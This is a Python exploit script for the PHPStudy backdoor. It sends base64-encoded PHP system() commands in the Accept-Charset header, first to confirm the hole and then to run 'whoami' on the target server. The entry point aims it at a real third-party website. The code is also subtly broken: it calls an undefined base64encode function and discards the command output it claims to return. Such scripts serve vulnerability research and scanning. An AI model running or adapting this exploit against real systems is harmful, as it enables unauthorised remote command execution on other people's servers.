#!/usr/bin/env python3

import re
import base64
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Phpstudy_Backdoor_Rce_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }

    def check(self):
        """
        检测是否存在漏洞

        :param:
        :return True or False
        """
        command = "system(\"" + 'echo %swin^dowslin$1ux' %(self.capta) + "\");"
        command = base64encode(command)
        self.headers['Accept-Charset'] = command
        req = request.get(self.url, headers = self.headers)
        if self.capta in req.text:
            return True
            #print 'Target is vulnerable!!!' + '\n'
        else:
            return False
    

    def run(self):
        """
        执行whoami命令

        :param:
        :return cmd_result or False,'错误原因'
        """
        try:
            if self.check():
                command = "system(\"" + 'whoami' + "\");"
                command = base64encode(command)
                self.headers['Accept-Charset'] = command
                req = request.get(self.url, headers = self.headers)
                cmd_result = req.text.split('<!')[0]
                # print(cmd_result)
                return True
            else:
                return False
        except Exception as e:
            # print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    Phpstudy_Backdoor_Rce = Phpstudy_Backdoor_Rce_BaseVerify('http://baidu.com')
    print(Phpstudy_Backdoor_Rce.run())

